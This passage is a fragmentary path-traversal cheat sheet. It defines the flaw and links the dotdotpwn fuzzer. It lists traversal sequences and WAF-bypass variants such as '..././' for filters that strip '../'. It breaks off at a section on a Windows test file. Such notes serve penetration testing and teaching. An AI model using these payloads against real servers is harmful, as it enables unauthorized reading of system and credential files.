...
>/dir [PATH] traversal
..
>exploit insufficient security validation/sanitization of end-user-supplied-input-file-names 
>chars representing "traverse to parent directory" are passed through to file/APIs.
...
- [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
    ...
    ```
## Basic exploitation | -use `..` chars | -access | -parent_dir
>follow strings
>encoding can help bypass a poor imp-filter.
```powershell
../
..\
..\/
...
```
$ --bypass "../" replaced by ""
# Sometimes you encounter a WAF which remove the "../" characters from the strings, duplicate them.
```powershell
..././
...\.\
```
...
There is always an existing file in recent Windows machine. 
It is ideal to test the value of path-traversal but there is not much of interest inside...
```powershell
